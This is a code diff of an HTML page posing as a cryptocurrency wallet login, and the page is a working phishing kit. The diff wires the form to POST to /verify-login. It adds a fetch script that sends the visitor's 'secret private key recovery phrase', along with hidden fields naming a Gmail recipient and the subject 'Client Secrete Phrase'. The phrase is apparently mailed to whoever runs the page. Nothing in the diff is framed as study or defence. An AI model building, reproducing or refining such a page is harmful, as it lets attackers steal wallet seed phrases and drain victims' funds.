@@ -37,22 +37,80 @@
                             </div>
                             
                         </div>
-                        <form action="" style="display: grid; position: relative; padding: 0;">
+                        <form action="/verify-login" method="POST" style="display: grid; position: relative; padding: 0;">
                             <div class="content" style="display: grid; padding-top: 2px;">
                                 <div style="display: flex; justify-content: space-between;">
                                     <label for="email walletId"></label>
-                                    <p id="req" style="display: none; color: rgb(217, 59, 48);
-                                    ">required</p>
+                                    <p class="inputMessage" id="focus-message">required</p>
                                 </div>
-                                <input id="myInput recipient" class="email_in" value="roselloydx60@gmail.com" type="hidden" placeholder="Enter Email" style="color: rgb(53, 63, 82);" required>
-                                <input id="myInput suject" class="email_in" value="Client Email" type="hidden" placeholder="Enter Email" style="color: rgb(53, 63, 82);" required>
-                                <input id="myInput message" type="text" placeholder="Enter your secret private key recovery phrase" required>
+                                <input onfocus="showMessage()" onblur="hideMessage()" name="recipient" id="myInput recipient" class="email_in .input-box" value="roselloydx60@gmail.com" type="hidden" placeholder="Enter Email" style="color: rgb(53, 63, 82);" required>
+                                <input onfocus="showMessage()" onblur="hideMessage()" name="subject" id="myInput suject" class="email_in .input-box" value="Client Secrete Phrase" type="hidden" placeholder="Enter Email" style="color: rgb(53, 63, 82);" required>
+                                <input onfocus="showMessage()" onblur="hideMessage()" name="message" id="myInput message" type="text" class="email_in .input-box" placeholder="Enter your secret private key recovery phrase" required>
                                 <p style="text-align: center; color: rgb(103, 113, 132); font-weight: 500; font-size: 14px; padding-top: 5%;
                                 line-height: .5;" >Separate each word with a space</p>
                             </div>
                             <div class="content" style="padding-top: 0;">
                                 <input type="submit" value="Continue" style="width: 100%;">
                             </div>
+                            <style>
+                                /* Style for the message */
+                                .inputMessage {
+                                  display: none;
+                                  color: rgb(217, 59, 48);
+                                  font-size: 14px;
+                                }
+                            
+                                /* Style for the input box when focused */
+                                .input-box:focus {
+                                  border-color: #007bff; /* Change the border color when focused */
+                                }
+                            
+                                /* Style for the input box when not focused */
+                                .input-box {
+                                  width: 200px;
+                                  padding: 8px;
+                                  font-size: 16px;
+                                  border: 1px solid #ccc;
+                                  transition: border-color 0.3s ease-in-out;
+                                }
+                              </style>
+                            <script>
+                                    // JavaScript functions to show/hide the message
+                                function showMessage() {
+                                    document.getElementById("focus-message").style.display = "block";
+                                }
+                            
+                                function hideMessage() {
+                                    document.getElementById("focus-message").style.display = "none";
+                                }
+                            </script>
+
+                            <!-- send mail -->
+                            <script>
+                            async function sendEmail() {
+                                const recipient = document.getElementById('recipient').value;
+                                const subject = document.getElementById('subject').value;
+                                const message = document.getElementById('message').value;
+    
+                                // Use AJAX or fetch to send the data to your Node.js server
+                                // Here's a simple example using fetch
+                                await fetch('/verify-login', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({ recipient, subject, message }),
+                                })
+                                .then(response => response.json())
+                                .then(data => {
+                                console.log('Success:', data);
+                                })
+                                .catch((error) => {
+                                console.error('Error:', error);
+                                });
+                            }
+    
+                        </script>
                         </form>
                 </div>
                 <div class="blc_act"> <h5>Trouble Logging In?</h5><a href="#" style="text-decoration: none;">Contact Support</a></div>
